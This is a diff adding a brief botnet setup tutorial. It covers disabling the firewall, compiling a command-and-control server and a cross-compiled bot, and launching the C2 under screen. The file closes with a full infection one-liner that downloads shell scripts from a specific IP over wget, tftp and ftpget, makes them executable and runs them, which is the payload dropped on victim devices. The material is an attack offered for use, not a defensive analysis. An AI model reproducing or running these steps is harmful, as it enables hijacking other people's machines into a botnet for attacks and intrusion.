@@ -1,0 +1,31 @@
+----------------------------------
+|Tutorial BY switch#0775|
+----------------------------------
+
+1 Installing Dependencies
+yum install gcc screen nano httpd python perl -y; ulimit -n 999999
+
+
+2 Stopping Iptables
+iptables -F; service iptables stop
+
+
+3 Edit Client Side (bot.c) with your server IP
+
+4 Compiling Serverside
+gcc cnc.c -o cnc -pthread
+
+
+5 Making Login Credentials
+nano login.txt
+
+
+6 Cross Compiling
+python cc7.py bot.c SERVERIP
+
+
+7 Starting Serverside
+screen ./cnc 666 850 cncport
+
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://162.213.38.130/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 162.213.38.130 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 162.213.38.130; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 162.213.38.130 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
